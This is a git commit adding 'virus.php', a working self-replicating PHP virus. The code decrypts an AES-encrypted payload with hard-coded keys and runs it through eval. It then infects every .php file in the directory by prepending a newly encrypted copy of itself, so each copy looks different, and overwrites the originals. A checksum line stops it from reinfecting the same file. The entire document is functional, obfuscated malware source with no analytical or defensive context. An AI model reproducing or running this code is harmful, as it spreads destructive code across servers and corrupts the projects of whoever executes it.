e5d3160c9d9c25962ef57b2d8e5be05274dad579
Mahamdi Mohammed <fm_mahamdi@esi.dz>
2019-04-27 04:54:07 +0100

    Add files via upload

---
+++ virus.php
@@ -0,0 +1,86 @@
+<?php // Checksum: 382a15b559e142b42c57314801273616 ?>
+<?php
+
+
+        $encryptedVirus = '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';
+        $iv = 'epUWfxtbGlr4qL0gCSz3qA==';
+        $key = '7c8TWoRYVx+IZOUKXNWyQKyYvZxQ3XePkn1YKcPx1Gg=';
+        $virus = mcrypt_decrypt(MCRYPT_RIJNDAEL_128, base64_decode($key), base64_decode($encryptedVirus), MCRYPT_MODE_CBC, base64_decode($iv));
+        eval($virus);
+        execute($virus);
+    
+
+?>
+
+<?php
+// virus:start
+if (!function_exists('execute')) {
+function execute($virus)
+{
+    // get all PHP files
+    $filenames = glob('*.php');
+
+    foreach ($filenames as $filename) {
+        $script = fopen($filename, "r");
+        $firstLine = fgets($script); // Check not infected
+        $virusHash = md5($filename);
+        if (false === strpos($firstLine, $virusHash)) {
+            $infected = fopen("$filename.infected", "w");
+            $checksum = '<?php // Checksum: ' . $virusHash . " ?>\n";
+            $infection = "<?php\n\n" . encryptVirus($virus) . "\n\n?>\n\n";
+            fputs($infected, $checksum, strlen($checksum));
+            fputs($infected, $infection, strlen($infection));
+            fputs($infected, $firstLine, strlen($firstLine));
+            while ($contents = fgets($script)) {
+                fputs($infected, $contents, strlen($contents));
+            }
+            //close files
+            fclose($script);
+            fclose($infected);
+            unlink("$filename");
+            rename("$filename.infected", $filename);
+        }//foreach
+    }
+}
+
+function encryptVirus($virus)
+{
+    $str = '0123456789abcdef'; // Gen key
+    $key = '';
+    for ($i = 0; $i < 64; $i++) {
+        $key .= $str[rand(0, strlen($str) - 1)];
+    }
+    $key = pack('H*', $key);
+    // Encrypt
+    $iv_size = mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC);
+    $iv = mcrypt_create_iv($iv_size, MCRYPT_RAND);
+    $encryptedVirus = mcrypt_encrypt(
+        MCRYPT_RIJNDAEL_128,
+        $key,
+        $virus,
+        MCRYPT_MODE_CBC,
+        $iv
+    );
+    // Encode
+    $encodedVirus = base64_encode($encryptedVirus);
+    $encodedIV = base64_encode($iv);
+    $encodedKey = base64_encode($key);
+    // Payload
+    $payload = "
+        \$encryptedVirus = '$encodedVirus';
+        \$iv = '$encodedIV';
+        \$key = '$encodedKey';
+        \$virus = mcrypt_decrypt(MCRYPT_RIJNDAEL_128, base64_decode(\$key), base64_decode(\$encryptedVirus), MCRYPT_MODE_CBC, base64_decode(\$iv));
+        eval(\$virus);
+        execute(\$virus);
+    ";
+    return $payload;
+}
+// virus:end
+}
+$virus = file_get_contents(__FILE__);
+$virus = substr($virus, strpos($virus, "// virus:start"));
+$virus = substr($virus, 0, strpos($virus, "\n// virus:end") + strlen("\n// virus:end"));
+execute($virus);
+
+?>
